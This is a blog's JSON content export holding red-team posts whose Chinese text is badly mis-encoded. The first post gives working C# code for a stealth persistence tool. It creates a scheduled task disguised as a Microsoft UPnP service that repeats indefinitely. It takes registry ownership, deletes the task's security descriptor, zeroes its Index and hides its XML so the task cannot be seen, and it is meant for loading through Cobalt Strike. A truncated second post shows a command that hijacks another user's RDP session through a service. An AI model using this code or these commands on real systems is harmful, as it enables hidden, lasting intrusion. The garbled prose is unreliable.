{"meta":{"title":"AnonySec'Blog","subtitle":"","description":"","author":"AnonySec","url":"https://payloads.cn","root":"/"},"pages":[{"title":"åˆ†ç±»","date":"2021-01-27T08:34:00.122Z","updated":"2019-12-04T13:50:02.000Z","comments":false,"path":"categories/index.html","permalink":"https://payloads.cn/categories/index.html","excerpt":"","text":""},{"title":"å…³äº","date":"2021-09-14T06:28:28.328Z","updated":"2021-09-14T06:28:28.325Z","comments":false,"path":"about/index.html","permalink":"https://payloads.cn/about/index.html","excerpt":"","text":"Hi there 1234ğŸ¦¸â€ AnonySecğŸ“§ anonysec@vip.qq.comâœï¸ ä¸ç”˜åœ¨å¥‹æ–—çš„å¹´çºªé€‰æ‹©å®‰é€¸ï¼Œè®°å½•è¿™ä¸€è·¯çš„æˆé•¿å†ç¨‹ã€‚ğŸŒ™ 2019.12.5 å‡Œæ™¨ã€ŒHang&#39;Dayã€"},{"title":"æ ‡ç­¾","date":"2021-01-29T02:20:26.308Z","updated":"2019-12-04T13:50:11.000Z","comments":false,"path":"tags/index.html","permalink":"https://payloads.cn/tags/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2021-01-27T08:45:13.836Z","updated":"2021-01-27T08:45:13.836Z","comments":false,"path":"repository/index.html","permalink":"https://payloads.cn/repository/index.html","excerpt":"","text":""}],"posts":[{"title":"Windowsè®¡åˆ’ä»»åŠ¡çš„è¿›é˜¶","slug":"Windowsè®¡åˆ’ä»»åŠ¡çš„è¿›é˜¶","date":"2021-08-05T02:01:10.000Z","updated":"2021-09-01T07:04:53.058Z","comments":true,"path":"2021/0805/.html","link":"","permalink":"https://payloads.cn/2021/0805/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn é¡¹ç›®åœ°å€ï¼šSchTask æœ¬æ–‡é˜è¿°Windowsè®¡åˆ’ä»»åŠ¡åœ¨ç³»ç»Ÿä¸­çš„éšè—æ–¹å¼åŠå·¥å…·åŒ–çš„è½¬æ¢ã€‚ éšè—å‰è¨€è®¡åˆ’ä»»åŠ¡ä½œä¸ºæŒä¹…åŒ–çš„æœºåˆ¶ä¹‹ä¸€ï¼Œä¹Ÿè¢«ç”¨åœ¨çº¢é˜Ÿè¡ŒåŠ¨ä¸­ã€‚ä½†å¸¸è§çš„åˆ©ç”¨æ–¹æ³•åœ¨è¢«å®‰å…¨è½¯ä»¶é˜»æ–­çš„åŒæ—¶ï¼Œä¹Ÿæ²¡æœ‰è¾¾åˆ°éšè—æ•ˆæœï¼Œå¹¶æé«˜äº†è¢«å‘ç°çš„é£é™©ã€‚æ‰€ä»¥ï¼Œéœ€è¦æ·±å…¥ç†è§£åˆ©ç”¨è®¡åˆ’ä»»åŠ¡ï¼Œè§„é¿é£é™©ï¼Œè¾¾åˆ°æŒä¹…æ§åˆ¶ã€‚ åˆ›å»ºè®¡åˆ’ä»»åŠ¡at.exe åœ¨ windows8 å¼€å§‹å°±å¼ƒç”¨äº†ï¼Œä¹‹åçš„ç³»ç»Ÿéƒ½æ˜¯ä½¿ç”¨ schtasks.exe åˆ›å»ºè®¡åˆ’ä»»åŠ¡ã€‚schtasks æ¯” at æ›´åŠ å¼ºå¤§ï¼Œ ä½¿ç®¡ç†å‘˜èƒ½å¤Ÿåœ¨æœ¬åœ°æˆ–è¿œç¨‹è®¡ç®—æœºä¸Šåˆ›å»ºã€åˆ é™¤ã€æŸ¥è¯¢ã€æ›´æ”¹ã€è¿è¡Œå’Œç»“æŸè®¡åˆ’ä»»åŠ¡ã€‚ è¿è¡Œä¸å¸¦å‚æ•°çš„ schtasks.exe å°†æ˜¾ç¤ºæ¯ä¸ªå·²æ³¨å†Œä»»åŠ¡çš„çŠ¶æ€å’Œä¸‹æ¬¡è¿è¡Œæ—¶é—´ã€‚ æ›´å¤šæŸ¥çœ‹ Microsoft æ–‡æ¡£ 123456schtasks &#x2F;Create [&#x2F;S system [&#x2F;U username [&#x2F;P [password]]]][&#x2F;RU username [&#x2F;RP [password]] &#x2F;SC schedule [&#x2F;MO modifier] [&#x2F;D day][&#x2F;M months] [&#x2F;I idletime] &#x2F;TN taskname &#x2F;TR taskrun [&#x2F;ST starttime][&#x2F;RI interval] [ &#123;&#x2F;ET endtime | &#x2F;DU duration&#125; [&#x2F;K] [&#x2F;XML xmlfile] [&#x2F;V1]] [&#x2F;SD startdate] [&#x2F;ED enddate] [&#x2F;IT] [&#x2F;Z] [&#x2F;F] å‘½ä»¤è¡Œ1schtasks &#x2F;create &#x2F;tn TestSchtask &#x2F;tr C:\\Windows\\System32\\cmd.exe &#x2F;sc DAILY &#x2F;st 13:00:00 XML æ–‡ä»¶è®¡åˆ’ä»»åŠ¡ä¸€æ—¦åˆ›å»ºæˆåŠŸï¼Œå°†ä¼šè‡ªåŠ¨åœ¨ %SystemRoot%\\System32\\Tasks ç›®å½•ç”Ÿæˆä¸€ä¸ªå…³äºè¯¥ä»»åŠ¡çš„æè¿°æ€§ XML æ–‡ä»¶ï¼ŒåŒ…å«äº†æ‰€æœ‰çš„ä»»åŠ¡ä¿¡æ¯ã€‚ è¿è¡Œ taskschd.msc ï¼ŒåŒæ—¶å¯ä»¥åœ¨ä»»åŠ¡è®¡åˆ’ç¨‹åºçœ‹åˆ°åˆšæ‰æ‰€åˆ›å»ºçš„ä»»åŠ¡ï¼Œå¤„åœ¨ç¨‹åºåº“çš„æ ¹ç›®å½•ä¸‹ã€‚ æ³¨å†Œè¡¨åœ¨ Windows XP æ—¶ï¼Œè®¡åˆ’ä»»åŠ¡æ³¨å†Œè¡¨è·¯å¾„ä¸º 1è®¡ç®—æœº\\HKEY_LOCAL_MACHINE\\Software\\Microsoft\\SchedulingAgent\\ Windows7 ä»¥åå˜æˆ 1è®¡ç®—æœº\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\ ä»¥ Windows 10 ä¸ºä¾‹ï¼ŒæŸ¥çœ‹åˆšæ‰æ‰€åˆ›å»ºä»»åŠ¡è®¡åˆ’çš„é”®å€¼ï¼Œè·¯å¾„ï¼šè®¡ç®—æœº\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\TestTask Id {GUID}ï¼Œä»»åŠ¡å¯¹åº”çš„guidç¼–å·ã€‚ Index ä¸€èˆ¬ä»»åŠ¡å€¼ä¸º3ï¼Œå…¶ä»–å€¼æœªçŸ¥ã€‚ SD Security Descriptor å®‰å…¨æè¿°ç¬¦ï¼Œåœ¨Windowsä¸­ï¼Œæ¯ä¸€ä¸ªå®‰å…¨å¯¹è±¡å®ä½“éƒ½æ‹¥æœ‰ä¸€ä¸ªå®‰å…¨æè¿°ç¬¦ï¼Œå®‰å…¨æè¿°ç¬¦åŒ…å«äº†è¢«ä¿æŠ¤å¯¹è±¡ç›¸å…³è”çš„å®‰å…¨ä¿¡æ¯çš„æ•°æ®ç»“æ„ï¼Œå®ƒçš„ä½œç”¨ä¸»è¦æ˜¯ä¸ºäº†ç»™æ“ä½œç³»ç»Ÿæä¾›åˆ¤æ–­æ¥è®¿å¯¹è±¡çš„æƒé™ã€‚ ã€ ç»æµ‹è¯•ï¼šWindows 7 ã€Windows Server 2008 æ—  SD å€¼ã€Windows 10 æœ‰ SD å€¼ ã€‘ å®‰å…¨è½¯ä»¶é˜»æ­¢å¦‚æœä¸»æœºå­˜åœ¨å®‰å…¨è½¯ä»¶ï¼Œè®¡åˆ’ä»»åŠ¡çš„åˆ›å»ºä¼šè¢«é˜»æ­¢ï¼Œå‘½ä»¤è¡Œæ— æ³•æˆåŠŸåˆ›å»ºã€‚ï¼ˆå¯é€šè¿‡ è®¡åˆ’ä»»åŠ¡API ç»•è¿‡ï¼Œå·¥å…·åŒ–åˆ©ç”¨æ­¤ç‚¹ï¼‰ schtasks /create /tn &quot;TestTask&quot; /ru system /tr C:\\Windows\\System32\\cmd.exe /sc weekly /d mon /st 01:00 éšè—å§¿åŠ¿éå®Œå…¨éšè—éå®Œå…¨éšè—ä¸€ä¸ªè®¡åˆ’ä»»åŠ¡ï¼Œé€šè¿‡ä¿®æ”¹ \\Schedule\\TaskCache\\Tree ä¸‹å¯¹åº”ä»»åŠ¡çš„ Index å€¼ï¼Œä¸€èˆ¬æƒ…å†µä¸‹å€¼ä¸º 3 ã€‚ Index ä¿®æ”¹ ä¿®æ”¹ HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\&#123;TaskName&#125; ä¸‹å¯¹åº”ä»»åŠ¡çš„ Index å€¼ä¸º 0 ä»¥ Windows 10 ä¸ºä¾‹ï¼Œæ–°å»ºè®¡åˆ’ä»»åŠ¡ cmd çš„é«˜çº§å®‰å…¨è®¾ç½®ä¸­æ‰€æœ‰è€…ä¸º SYSTEMï¼Œé»˜è®¤æ— æ³•æ›´æ”¹æ³¨å†Œè¡¨é”®å€¼ã€‚ æ›´æ”¹æ‰€æœ‰è€…ä¸º Administratorsï¼Œå¹¶èµ‹äºˆå®Œå…¨æ§åˆ¶æƒé™ï¼Œæ‰èƒ½ä¿®æ”¹æ³¨å†Œè¡¨é”®å€¼ã€‚ å½“ Index ä¿®æ”¹ä¸º 0 åï¼Œ åˆ©ç”¨ taskschd.mscã€schtasks.exe ã€ç”šè‡³ç³»ç»ŸAPIæŸ¥è¯¢å‡ºçš„æ‰€æœ‰ä»»åŠ¡ä¸­ï¼Œéƒ½æŸ¥çœ‹ä¸åˆ°æ‰€åˆ›å»ºçš„ä»»åŠ¡ã€‚ä½†å¦‚æœçŸ¥é“è¯¥ä»»åŠ¡åç§°ï¼Œå¯ä»¥é€šè¿‡ schtasks /query /tn &#123;TaskName Path&#125; æŸ¥åˆ°ã€‚ ä½†åœ¨ Windows Server 2008 ä¸ Windows 7 ä¸­ï¼Œä¿®æ”¹ Index é”®å€¼ä¸º 0 ï¼Œä»»åŠ¡è®¡åˆ’ç¨‹åºä¸­ä»å­˜åœ¨è¯¥ä»»åŠ¡ã€‚åŸå› æœªçŸ¥ XML æ–‡ä»¶åˆ é™¤ åˆ é™¤ %SystemRoot%\\System32\\Tasks ä¸‹ä»»åŠ¡å¯¹åº”çš„ XML æ–‡ä»¶ åœ¨ Windows 10 ä¸­ï¼Œåˆ é™¤ XML æ–‡ä»¶ï¼Œå¹¶ä¸å½±å“è®¡åˆ’ä»»åŠ¡çš„è¿è¡Œï¼Œä¸”åœ¨ taskschd.msc ä»»åŠ¡è®¡åˆ’ç¨‹åºä¸­ï¼Œä¾ç„¶å­˜åœ¨å¯¹åº”ä»»åŠ¡ï¼› åœ¨ Windows 7 ä¸ Windows Server 2008 ä¸­ï¼Œè‹¥åˆ é™¤ XML æ–‡ä»¶ï¼Œä»»åŠ¡è®¡åˆ’ç¨‹åºä¸­çš„å¯¹åº”ä»»åŠ¡ä¹Ÿä¼šè¢«åˆ é™¤ï¼Œå¹¶ä¸”å½±å“è®¡åˆ’ä»»åŠ¡çš„è¿è¡Œï¼Œä½†æ³¨å†Œè¡¨ä¸­é¡¹å€¼ä¾ç„¶å­˜åœ¨ã€‚ å®Œå…¨éšè—SD åˆ é™¤ åˆ é™¤ HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\&#123;TaskName&#125;\\SD åˆ é™¤ %SystemRoot%\\System32\\Tasks ä¸‹ä»»åŠ¡å¯¹åº”çš„ XML æ–‡ä»¶ è¿™æ ·æ“ä½œï¼Œæ— è®ºä½•ç§æ–¹å¼ (æ’é™¤æ³¨å†Œè¡¨) éƒ½æŸ¥ä¸åˆ°è¯¥ä»»åŠ¡ï¼Œè¾ƒä¸ºå½»åº•ã€‚å› ä¸º SD å°±æ˜¯å®‰å…¨æè¿°ç¬¦ï¼Œå®ƒçš„ä½œç”¨ä¸»è¦æ˜¯ä¸ºäº†ç»™æ“ä½œç³»ç»Ÿæä¾›åˆ¤æ–­æ¥è®¿å¯¹è±¡çš„æƒé™ï¼Œä½†è¢«åˆ é™¤åï¼Œæ— æ³•åˆ¤æ–­ç”¨æˆ·æ˜¯å¦æœ‰æƒé™æŸ¥çœ‹è¯¥ä»»åŠ¡ä¿¡æ¯ï¼Œå¯¼è‡´ç³»ç»Ÿç›´æ¥åˆ¤æ–­æ— æƒé™æŸ¥çœ‹ã€‚å› æ­¤åœ¨ä½¿ç”¨ schtasks /query /tn \\Microsoft\\Windows\\AppID\\cmd æŸ¥è¯¢æ—¶ï¼Œæç¤ºâ€œé”™è¯¯: ç³»ç»Ÿæ‰¾ä¸åˆ°æŒ‡å®šçš„æ–‡ä»¶â€ã€‚ ä½†ç»è¿‡æµ‹è¯•ï¼ŒWindows 7 ã€Windows Server 2008 æ—  SD å€¼ã€Windows 10 æœ‰ SD å€¼ã€‚ æ€»ç»“Windows è®¡åˆ’ä»»åŠ¡çš„éšè—å¹¶æœªç»å¯¹ï¼Œå› æ“ä½œç³»ç»Ÿå­˜åœ¨å·®å¼‚ï¼Œæœ€ç»ˆå®ç°çš„æ•ˆæœä¹Ÿä¸åŒã€‚ä½†ä½œä¸ºæŒä¹…åŒ–çš„æœºåˆ¶ä¹‹ä¸€ï¼Œéœ€è¦æ·±å…¥ç†è§£åˆ©ç”¨ã€‚ å·¥å…·åŒ–ä¸»è¦ä»¥è®¡åˆ’ä»»åŠ¡çš„ä»£ç å¼€å‘ä¸ºä¸»ï¼Œå°†æ‰‹å·¥åŒ–è½¬å˜ä¸ºå·¥å…·åŒ–ã€‚ æ•ˆæœå›¾ å®ç°æ­¥éª¤ é€‰æ‹©ä¸»æœºéšæœºè¿›ç¨‹åä½œä¸ºè®¡åˆ’ä»»åŠ¡ç¨‹åºæ–‡ä»¶å å°†è®¡åˆ’ä»»åŠ¡ç¨‹åºæ–‡ä»¶å¤åˆ¶åˆ° %AppData%\\Microsoft\\Windows\\Themes\\ ä¸­ åˆ›å»ºçš„è®¡åˆ’ä»»åŠ¡åå–åŒä¸€éšæœºè¿›ç¨‹å è®¡åˆ’ä»»åŠ¡è§¦å‘å™¨ä»¥åˆ†é’Ÿä¸ºå•ä½ï¼Œæ— é™æœŸæŒç»­ æ›´æ”¹ Indexã€åˆ é™¤ SD çš„é”®å€¼ï¼Œéšè—è®¡åˆ’ä»»åŠ¡å¯¹åº”çš„ XML æ–‡ä»¶ åˆ é™¤å·²æ·»åŠ çš„è®¡åˆ’ä»»åŠ¡ ç¼–å†™ä»£ç ç¼–å†™ä»»åŠ¡è®¡åˆ’çš„å·¥å…·ï¼Œéœ€è¦ç”¨åˆ°ä»»åŠ¡è®¡åˆ’APIï¼šMicrosoft.Win32.TaskScheduler.dllã€‚åœ¨ Visual Studio ä¸­ï¼Œå¯ä»¥ç›´æ¥ä»NuGetç¨‹åºåŒ…ä¸­å®‰è£…è·å–ã€‚å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ä» GitHub TaskScheduler ä¸­ä¸‹è½½è·å–ã€‚ éšæœºè¿›ç¨‹åé€‰æ‹©ä¸»æœºéšæœºè¿›ç¨‹åï¼Œä½œä¸ºè®¡åˆ’ä»»åŠ¡ç¨‹åºæ–‡ä»¶åä¸è®¡åˆ’ä»»åŠ¡åï¼Œä¸»è¦ä¸ºäº†æ¯æ¬¡è¿è¡Œåç§°éƒ½éšæœºï¼Œé˜²æ­¢åç»­è¢«æº¯æºï¼Œå¹¶ä¸”å–éšæœºè¿›ç¨‹åï¼Œä¹Ÿæ˜¯ä¸€ç§éšåŒ¿ã€‚ 1234//é€‰æ‹©ä¸»æœºéšæœºè¿›ç¨‹åProcess[] progresses = Process.GetProcesses();Random random = new Random();string randomname = (progresses[random.Next(progresses.Length)].ProcessName); åˆ›å»ºè®¡åˆ’ä»»åŠ¡è§¦å‘å™¨ä»¥åˆ†é’Ÿä¸ºå•ä½ï¼Œæ— é™æœŸæŒç»­çš„è¿è¡Œæ‰€åˆ›å»ºçš„è®¡åˆ’ä»»åŠ¡ï¼Œä¸»è¦æ˜¯ä¸ºäº†æƒé™çš„æŒä¹…æ€§ã€‚å¦‚æœè¯´åªè¿è¡Œä¸€æ¬¡æˆ–æŒç»­æ—¶é—´ä¸ºä¸€å¤©ï¼Œé‚£å¯¹äºæƒé™çš„ç»´æŒå¯ä»¥è¯´æ˜¯æ¯«æ— æ„ä¹‰ã€‚ è®¡åˆ’ä»»åŠ¡çš„åˆ›å»ºæ²¡æœ‰æ”¾åœ¨æ ¹è·¯å¾„ä¸‹ï¼Œè€Œæ˜¯åˆ›å»ºåœ¨\\Microsoft\\Windows\\UPnP\\ è·¯å¾„ä¸‹ï¼Œè¾¾åˆ°éšåŒ¿ã€‚ 1234567891011121314151617//åˆ›å»ºè®¡åˆ’ä»»åŠ¡public static void CreateTask(string randomname, string destinationFile, string min)&#123; TaskDefinition td = TaskService.Instance.NewTask(); td.RegistrationInfo.Author = &quot;Microsoft&quot;; //åˆ›å»ºè€… td.RegistrationInfo.Description = &quot;UPnPHost Service Settings&quot;; //æè¿° //è®¡åˆ’ä»»åŠ¡è¿è¡Œæ—¶é—´ Min/æ— é™æœŸ double time = double.Parse(min); TimeTrigger tt = new TimeTrigger(); tt.StartBoundary = DateTime.Now; tt.Repetition.Interval = TimeSpan.FromMinutes(time); td.Triggers.Add(tt); td.Actions.Add(destinationFile, null, null); string taskpath = @&quot;\\Microsoft\\Windows\\UPnP\\&quot; + randomname; TaskService.Instance.RootFolder.RegisterTaskDefinition(taskpath, definition: td, TaskCreation.CreateOrUpdate, null, null, 0);&#125; éšè—è®¡åˆ’ä»»åŠ¡XML æ–‡ä»¶éšè—æ–‡ä¸­å·²ç»è¯´è¿‡ï¼š åœ¨ Windows 10 ä¸­ï¼Œåˆ é™¤ XML æ–‡ä»¶ï¼Œå¹¶ä¸å½±å“è®¡åˆ’ä»»åŠ¡çš„è¿è¡Œï¼Œä¸”åœ¨ taskschd.msc ä»»åŠ¡è®¡åˆ’ç¨‹åºä¸­ï¼Œä¾ç„¶å­˜åœ¨å¯¹åº”ä»»åŠ¡ï¼› åœ¨ Windows 7 ä¸ Windows Server 2008 ä¸­ï¼Œè‹¥åˆ é™¤ XML æ–‡ä»¶ï¼Œä»»åŠ¡è®¡åˆ’ç¨‹åºä¸­çš„å¯¹åº”ä»»åŠ¡ä¹Ÿä¼šè¢«åˆ é™¤ï¼Œå¹¶ä¸”å½±å“è®¡åˆ’ä»»åŠ¡çš„è¿è¡Œã€‚ ä¸ºäº†ç¨‹åºçš„å¯ç”¨æ€§ï¼Œè¿™é‡Œåªèƒ½å°† XML æ–‡ä»¶è¿›è¡Œéšè—ï¼Œè€Œä¸æ˜¯åˆ é™¤ã€‚ 1234567891011//éšè— %SystemRoot%\\System32\\Tasks ä¸‹è®¡åˆ’ä»»åŠ¡å¯¹åº”çš„ XML æ–‡ä»¶public static void HidXml(string taskpath)&#123; string xml = $@&quot;C:\\Windows\\System32\\Tasks&quot; + taskpath; FileInfo info = new FileInfo(xml); if (info.Exists) &#123; info.Attributes = FileAttributes.Hidden; Console.WriteLine($&quot;[*] Hidden task xml file: \\n&#123;xml&#125;&quot;); &#125;&#125; Index ä¿®æ”¹é€šè¿‡ä¿®æ”¹ HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\&#123;TaskName&#125; ä¸‹å¯¹åº”ä»»åŠ¡çš„ Index å€¼ä¸º 0åï¼Œåˆ©ç”¨ taskschd.mscã€schtasks.exe ã€API éƒ½æŸ¥çœ‹ä¸åˆ°æ‰€åˆ›å»ºçš„ä»»åŠ¡ã€‚ é¦–å…ˆéœ€è¦æ›´æ”¹æ³¨å†Œè¡¨å¯¹åº”è®¡åˆ’ä»»åŠ¡é¡¹å€¼çš„é«˜çº§å®‰å…¨è®¾ç½®ä¸­çš„æ‰€æœ‰è€…ã€‚åœ¨æœªè·å–ç‰¹æƒæ¨¡å¼ä¸‹ï¼Œå·¥å…·è¿è¡Œåæç¤ºâ€œæ‹’ç»è®¿é—®â€ï¼Œè¿™æ˜¾ç„¶æ˜¯æƒé™ä¸è¶³ã€‚ å¯ä»¥ä½¿ç”¨ TokenManipulator ç±» ï¼Œä»è€Œè·å–ç‰¹æƒæ¨¡å¼ã€‚è¿™å°±éœ€è¦åœ¨é¡¹ç›®ä¸­æ·»åŠ ä¸€ä¸ªæ–°çš„C#ç±»ï¼Œä¹‹ååœ¨å¤´éƒ¨ using CosmosKey.Utils; ã€‚ 123456789101112131415try&#123; TokenManipulator.AddPrivilege(&quot;SeRestorePrivilege&quot;); TokenManipulator.AddPrivilege(&quot;SeBackupPrivilege&quot;); TokenManipulator.AddPrivilege(&quot;SeTakeOwnershipPrivilege&quot;); var subKey = Registry.ClassesRoot.OpenSubKey(@&quot;AppID\\&#123;9CA88EE3-ACB7-47c8-AFC4-AB702511C276&#125;&quot;, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.TakeOwnership); // code to change owner...&#125;finally&#123; TokenManipulator.RemovePrivilege(&quot;SeRestorePrivilege&quot;); TokenManipulator.RemovePrivilege(&quot;SeBackupPrivilege&quot;); TokenManipulator.RemovePrivilege(&quot;SeTakeOwnershipPrivilege&quot;);&#125; è·å–ç‰¹æƒæ¨¡å¼åï¼Œæ›´æ”¹æ³¨å†Œè¡¨é¡¹å€¼çš„æ‰€æœ‰è€…ä¸º Administratorsï¼ŒåŒæ—¶è¦æ›´æ”¹æ³¨å†Œè¡¨é¡¹å€¼çš„æƒé™ï¼Œè¿™æ‰èƒ½å¯¹ Index è¿›è¡Œä¿®æ”¹æ“ä½œã€‚ 12345678910111213//æ›´æ”¹æ³¨å†Œè¡¨é¡¹å€¼çš„æ‰€æœ‰è€…RegistryKey subKey = Registry.LocalMachine.OpenSubKey(regpath,RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRightsTakeOwnership);RegistrySecurity rs = new RegistrySecurity();//è®¾ç½®å®‰å…¨æ€§çš„æ‰€æœ‰è€…ä¸ºAdministratorsrs.SetOwner(new NTAccount(&quot;Administrators&quot;));//ä¸ºæ³¨å†Œè¡¨é¡¹è®¾ç½®æƒé™subKey.SetAccessControl(rs);//æ›´æ”¹æ³¨å†Œè¡¨é¡¹å€¼çš„æƒé™RegistryAccessRule rar = new RegistryAccessRule(&quot;Administrators&quot;,RegistryRights.FullControl, AccessControlType.Allow);rs.AddAccessRule(rar);subKey.SetAccessControl(rs);subKey.Close(); SD åˆ é™¤SD é”®å€¼çš„åˆ é™¤ï¼Œæ˜¯è®¡åˆ’ä»»åŠ¡å®Œå…¨éšè—é¡¹ä¹‹ä¸€ï¼Œå½“ç„¶è¦æ’é™¤åœ¨æ³¨å†Œè¡¨ä¸­æŸ¥çœ‹ã€‚ä½†ç»è¿‡æµ‹è¯•ï¼ŒWindows 7 ã€Windows Server 2008 æ—  SD å€¼ã€Windows 10 æœ‰ SD å€¼ã€‚æ‰€ä»¥å°±è¦åš if çš„åˆ¤æ–­ï¼Œä»¥å…ç¨‹åºæŠ¥é”™ã€‚ 123456789101112131415161718//åˆ¤æ–­SDé”®å€¼æ˜¯å¦å­˜åœ¨ï¼ˆWin7 ä¸ win2008 æ— SDï¼‰public static void RegeditKeyExist(string regpath)&#123; string[] subkeyNames; RegistryKey sd = Registry.LocalMachine.OpenSubKey(regpath, true); subkeyNames = sd.GetValueNames(); foreach (string keyName in subkeyNames) &#123; if (keyName == &quot;SD&quot;) &#123; sd.DeleteValue(&quot;SD&quot;); sd.Close(); return; &#125; &#125; sd.Close(); return;&#125; åˆ é™¤è®¡åˆ’ä»»åŠ¡ä¿®æ”¹æ³¨å†Œè¡¨ä¸­çš„é”®å€¼ Index ä¸ SD åï¼Œä»»åŠ¡è®¡åˆ’ç¨‹åºä¸­å°±æŸ¥çœ‹ä¸åˆ°è¯¥ä»»åŠ¡ã€‚é€šè¿‡ TaskCollection ä¹Ÿæ— æ³•æŸ¥åˆ°æ­¤ä»»åŠ¡ï¼Œå°±æ— æ³•åˆ é™¤æ‰€åˆ›å»ºçš„è®¡åˆ’ä»»åŠ¡ã€‚ æ‰€ä»¥ï¼Œä¸ºäº†å·¥å…·çš„å®Œæ•´æ€§ï¼Œåˆ é™¤ä»£ç åªåšå‚è€ƒï¼Œå¹¶æœªå¼•ç”¨åˆ°ç¨‹åºä¸­ã€‚ 1234567891011121314151617181920//åˆ é™¤è®¡åˆ’ä»»åŠ¡ (éœ€è¦ç®¡ç†å‘˜æƒé™)public static void DeleteTask(string taskname)&#123; //ä¸è¦å†™æˆ &quot;\\Microsoft\\Windows\\UPnP\\&quot; â€” æŠ¥é”™ â€” æ‰¾ä¸åˆ° string taskpath = @&quot;\\Microsoft\\Windows\\UPnP&quot;; //è·å¾—è®¡åˆ’ä»»åŠ¡ TaskService ts = new TaskService(); TaskCollection tc = ts.GetFolder(taskpath).GetTasks(); //Console.WriteLine($&quot;&#123;tc&#125;&quot;); if (tc.Exists(taskname)) &#123; string dtask = taskpath + &quot;\\\\&quot; + taskname; ts.RootFolder.DeleteTask(dtask); Console.WriteLine(&quot;\\n[+] Successfully delete scheduled task !&quot;); &#125; else &#123; Console.WriteLine(&quot;\\n[!] Please add scheduled task !&quot;); &#125;&#125; DLLæ–‡ä»¶æ‰“åŒ…åˆ°EXEå¼•ç”¨çš„ Microsoft.Win32.TaskScheduler.dll å¹¶ä¸èƒ½ç›´æ¥ç¼–è¯‘åˆ°ç¨‹åºä¸­ï¼Œæ¯æ¬¡è¿è¡Œå°±éœ€è¦ SchTask.exe ä¸Microsoft.Win32.TaskScheduler.dll åœ¨åŒä¸€ç›®å½•ä¸‹ï¼Œå¦åˆ™è¿è¡Œå°±ä¼šæŠ¥é”™ã€‚ å¯ä»¥ä½¿ç”¨ ILMerge å°† .Net çš„ DLL æ–‡ä»¶æ‰“åŒ…åˆ° EXE ä¸­ï¼Œç›´æ¥åœ¨ Visual Studio ä¸­ä½¿ç”¨ NuGet ç¨‹åºåŒ…ç®¡ç†ä¸‹è½½å®‰è£…å³å¯ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨ ILMerge-GUI å›¾å½¢åŒ–ç‰ˆæœ¬æ‰“åŒ…ï¼Œæ›´åŠ æ–¹ä¾¿ã€‚ ç¨‹åºæ‰“åŒ…åï¼Œåœ¨ CobaltStrike ä¸­åˆ©ç”¨ execute-assembly å¯ä»¥æˆåŠŸåœ¨å†…å­˜ä¸­åŠ è½½è¿è¡Œã€‚ ReferenceOwnership of registry TokenManipulator Class Use ILMerge packaging Task Scheduler for developers","categories":[{"name":"æƒé™ç»´æŒ","slug":"æƒé™ç»´æŒ","permalink":"https://payloads.cn/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://payloads.cn/tags/Windows/"}]},{"title":"RDPä¼šè¯åŠ«æŒä¸é˜²å¾¡","slug":"RDPä¼šè¯åŠ«æŒä¸é˜²å¾¡","date":"2021-07-16T08:14:33.000Z","updated":"2021-08-06T02:56:11.061Z","comments":true,"path":"2021/0716/.html","link":"","permalink":"https://payloads.cn/2021/0716/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn æ”»å‡»è€…åˆ©ç”¨ Windows RDPåè®®æ¥ç®¡ä»¥å‰æ–­å¼€çš„ä¼šè¯ï¼Œå¹¶ä»¥åˆæ³•ç”¨æˆ·èº«ä»½å‡ºç°ä»¥è·å¾—ç³»ç»Ÿè®¿é—®ä¸æ§åˆ¶ã€‚ RDP åŠ«æŒç®€è¦åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šè·å¾—äº†æœ¬åœ°ç®¡ç†å‘˜è®¿é—®æƒé™ï¼Œå¯ä»¥åœ¨ä¸çŸ¥é“å…¶ä»–ç”¨æˆ·ç™»å½•å‡­æ®çš„æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å°±æœ‰å¯èƒ½åŠ«æŒå¦ä¸€ä¸ªç”¨æˆ·çš„ RDP ä¼šè¯ã€‚ é»˜è®¤ä½¿ç”¨ tscon æˆ–ä»»åŠ¡ç®¡ç†å™¨ä¸­è¿›è¡Œåˆ‡æ¢ç”¨æˆ·ï¼Œä¼šè¢«è¦æ±‚è¾“å…¥å¯†ç ã€‚åœ¨æ²¡æœ‰å‡­æ®çš„æƒ…å†µä¸‹ï¼Œæ— æ³•è¿›è¡Œåˆ‡æ¢ä¼šè¯ã€‚ åˆ©ç”¨è¿‡ç¨‹-æœåŠ¡ query user ã€ quser ã€ qwinsta æŸ¥çœ‹ä¼šè¯IDã€‚ åˆ›å»ºä¸€ä¸ªä½¿ç”¨ç³»ç»Ÿçº§æƒé™æ‰§è¡Œtsconçš„æœåŠ¡ï¼Œå°†åŠ«æŒIDä¸º2çš„ä¼šè¯ã€‚ 12345&#x2F;&#x2F;åœ¨æ³¨å†Œè¡¨å’Œ&quot;æœåŠ¡æ§åˆ¶ç®¡ç†å™¨&quot;ä¸­ä¸ºæœåŠ¡åˆ›å»ºå­é¡¹å’Œé¡¹ç›®ã€‚sc create rdp binpath&#x3D; &quot;cmd.exe &#x2F;k tscon 2 &#x2F;dest:console&quot;&#x2F;&#x2F;æŸ¥è¯¢æœåŠ¡çš„é…ç½®ä¿¡æ¯sc qc rdp 